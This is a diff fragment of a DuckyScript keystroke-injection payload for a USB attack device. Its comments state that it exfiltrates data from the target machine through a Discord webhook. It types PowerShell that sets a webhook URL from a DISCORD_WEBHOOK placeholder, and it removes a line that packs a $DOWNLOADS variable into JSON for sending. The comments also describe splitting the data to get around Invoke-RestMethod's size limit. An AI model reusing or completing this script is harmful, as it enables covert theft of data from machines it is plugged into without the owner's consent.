@@ -46,14 +46,10 @@ ENTER
 REM It depends on the number of links
 DELAY 10000
 
-STRINGLN "
-
 REM Exfiltration using Discord Webhook
 STRING $WebhookUrl = "
 STRING DISCORD_WEBHOOK
 STRINGLN "
-
-STRINGLN $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
 
 REM This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
 STRINGLN
